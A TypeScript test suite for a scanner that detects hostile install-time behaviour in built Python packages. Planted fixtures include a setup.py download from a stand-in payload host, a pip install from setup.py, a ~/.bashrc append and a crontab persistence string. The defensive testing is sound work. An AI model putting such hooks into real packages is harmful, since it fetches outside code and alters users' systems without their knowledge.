// R3a (plan border-residue-gate): pypi leg — sdist setup.py / [build-system] hook scan,
// artifact-wide T4, `<archive>!<inner>` attribution. Doctrine mirrors test/residue.npm.test.ts:
// golden corpus on disk, mutants as patched tmp copies, real stage() calls
// (python3 -m build --no-isolation; planted code never executes network calls at build time —
// fetch/persist shapes live in functions nothing calls), engines skipped (residue is a native leg).
import assert from "node:assert/strict";
import { cpSync, readFileSync } from "node:fs";
import { join } from "node:path";
import { after, test } from "node:test";

import { scanPyPiArtifacts } from "../src/artifacts/pypi.ts";
import { computeVerdict, type Finding } from "../src/findings.ts";
import { makeFixtureDir, gitInit, gitAddCommit, writeRel, removeDir } from "./helpers/fixtures.ts";

const CORPUS = new URL("./fixtures/residue/", import.meta.url).pathname;
// setuptools normalizes the project name to underscores in the sdist file (PEP 503, build 1.6.0 live)
const SDIST = "acme_py-1.0.0.tar.gz";

const roots: string[] = [];
after(() => {
  for (const d of roots) removeDir(d);
});

/** Copy a corpus fixture into a fresh tmp repo, git-init + commit (manifestFindings compares
 *  against `git ls-files`; committed files never raise sdist-unexpected-file). */
function repoFrom(fixtureDir: string): string {
  const dir = makeFixtureDir(`residue-${fixtureDir}`);
  roots.push(dir);
  cpSync(join(CORPUS, fixtureDir), dir, { recursive: true });
  gitInit(dir);
  writeRel(dir, ".gitignore", ".border/\n__pycache__/\nbuild/\nsrc/*.egg-info/\n");
  gitAddCommit(dir, "residue fixture baseline");
  return dir;
}

async function stage(fixtureDir: string): Promise<readonly Finding[]> {
  const { findings } = await scanPyPiArtifacts({
    repoDir: repoFrom(fixtureDir),
    skipGitleaks: true,
    skipSecretlint: true,
  });
  return findings;
}

const residue = (fs: readonly Finding[]): Finding[] => fs.filter((f) => f.rule.startsWith("residue-"));
const byRule = (fs: readonly Finding[], rule: string): Finding[] => fs.filter((f) => f.rule === rule);

/** Mutate a tracked fixture file in the copy (tracked paths stay tracked ⇒ no manifest rows). */
function patch(dir: string, rel: string, text: string): void {
  writeRel(dir, rel, text);
}

function repoWithPatch(fixtureDir: string, rel: string, text: string): string {
  const dir = repoFrom(fixtureDir);
  patch(dir, rel, text);
  return dir;
}

async function stagePatched(fixtureDir: string, rel: string, text: string): Promise<readonly Finding[]> {
  const { findings } = await scanPyPiArtifacts({
    repoDir: repoWithPatch(fixtureDir, rel, text),
    skipGitleaks: true,
    skipSecretlint: true,
  });
  return findings;
}

const GOLDEN_SETUP = "# neutral shim\nfrom setuptools import setup\n\nsetup()\n";

test("R3a-PIN: clean sdist+wheel (console_scripts only) emits ZERO findings — characterization pin", async () => {
  const findings = await stage("l-py-clean");
  assert.deepEqual(findings, [], `pre-R3a clean fixture must stay silent, got ${JSON.stringify(findings.map((f) => `${f.rule}:${f.path}`))}`);
  assert.equal(computeVerdict(findings), "PASS");
});

test("R3a-PIN2: pinned neutral setup.py shim still builds clean (mutant base stays T0)", async () => {
  const findings = await stagePatched("l-py-clean", "setup.py", GOLDEN_SETUP);
  assert.equal(residue(findings).length, 0);
});

test("R3a-B (sdist download fetch ⇒ T2 HIGH row with <archive>!<inner> attribution)", async () => {
  const findings = await stagePatched(
    "l-py-clean",
    "setup.py",
    `${GOLDEN_SETUP}
import urllib.request


def _blob() -> None:  # PLANTED synthetic — never called at build time
    urllib.request.urlretrieve("https://payload.example.com/blob", "blob.bin")
`,
  );
  const t2 = byRule(findings, "residue-install-download");
  assert.equal(t2.length, 1, `exactly one T2 row, got ${JSON.stringify(t2.map((f) => f.path))}`);
  assert.equal(t2[0]?.severity, "HIGH");
  assert.equal(t2[0]?.path, `${SDIST}!setup.py`);
  assert.equal(t2[0]?.engine, "native");
  assert.match(t2[0]?.message ?? "", /t2-py-net/);
  assert.equal(byRule(findings, "residue-in-tree-hook").length, 0, "pypi has no T1 pass lane (plan §57)");
  assert.equal(computeVerdict(findings), "FAIL");
});

test("R3a-C (setup.py expanduser write + pip invocation ⇒ T3 HIGH + cross-manager HIGH naming ledger)", async () => {
  const findings = await stagePatched(
    "l-py-clean",
    "setup.py",
    `${GOLDEN_SETUP}
import os
import subprocess


def _stage() -> str:  # PLANTED synthetic
    base = os.path.expanduser("~/.local/share/acme")
    subprocess.run(["pip", "install", "--user", "acme-helper"], check=False)
    return base
`,
  );
  const t3 = byRule(findings, "residue-out-of-tree-write");
  const xm = byRule(findings, "residue-cross-manager-write");
  assert.equal(t3.length, 1, `one T3 row, got ${JSON.stringify(t3.map((f) => f.message))}`);
  assert.match(t3[0]?.message ?? "", /t3-py-expanduser/);
  assert.equal(t3[0]?.path, `${SDIST}!setup.py`);
  assert.equal(xm.length, 1);
  assert.match(xm[0]?.message ?? "", /pip/);
  assert.equal(computeVerdict(findings), "FAIL");
});

test("R3a-D (persistence primitive in a NON-hook packed module ⇒ T4 CRITICAL artifact-wide, both archives)", async () => {
  const findings = await stagePatched(
    "l-py-clean",
    "src/acme_pkg/cli.py",
    '"""entry"""\n\n\ndef main() -> None:  # PLANTED synthetic string only\n    print("crontab persistence hook")\n',
  );
  const t4 = byRule(findings, "residue-persistence-primitive");
  assert.equal(t4.length, 2, `T4 must fire on the module inside BOTH sdist and wheel trees, got ${JSON.stringify(t4.map((f) => f.path))}`);
  assert.ok(t4.every((f) => f.severity === "CRITICAL"));
  assert.ok(t4.some((f) => f.path === `${SDIST}!src/acme_pkg/cli.py`), "sdist attribution");
  assert.ok(t4.some((f) => /\.whl!acme_pkg\/cli\.py$/.test(f.path ?? "")), "wheel attribution");
  assert.equal(computeVerdict(findings), "FAIL");
});

test("R3a-E ([build-system] requires naming an http client ⇒ T2 on the block; [project] dependency must STAY silent)", async () => {
  const buildSys = await stagePatched(
    "l-py-clean",
    "pyproject.toml",
    readFileSync(join(CORPUS, "l-py-clean/pyproject.toml"), "utf8").replace(
      'requires = ["setuptools==78.1.1"]',
      'requires = ["setuptools==78.1.1", "httpx>=0.27"]',
    ),
  );
  const t2 = byRule(buildSys, "residue-install-download");
  assert.equal(t2.length, 1, `build-system httpx ⇒ one T2 row, got ${JSON.stringify(t2.map((f) => f.path))}`);
  assert.equal(t2[0]?.path, `${SDIST}!pyproject.toml`);

  const runtime = await stagePatched(
    "l-py-clean",
    "pyproject.toml",
    readFileSync(join(CORPUS, "l-py-clean/pyproject.toml"), "utf8").replace(
      'requires-python = ">=3.10"',
      'requires-python = ">=3.10"\ndependencies = ["httpx>=0.27"]',
    ),
  );
  assert.equal(residue(runtime).length, 0, "runtime [project].dependencies is NOT install-time code — out of scan scope (no overreach)");
});

test("R3a-F (marker-less rc append in setup.py ⇒ T3 dotfile family still fires)", async () => {
  const findings = await stagePatched(
    "l-py-clean",
    "setup.py",
    `${GOLDEN_SETUP}
import pathlib


def _rc() -> None:  # PLANTED synthetic
    rc = pathlib.Path.home() / ".bashrc"
    rc.write_text(rc.read_text() + 'export PATH="$HOME/.acme/bin:$PATH"\\n')
`,
  );
  const t3 = byRule(findings, "residue-out-of-tree-write");
  assert.equal(t3.length, 1);
  assert.match(t3[0]?.message ?? "", /t3-dotfile|t3-path-export/);
});
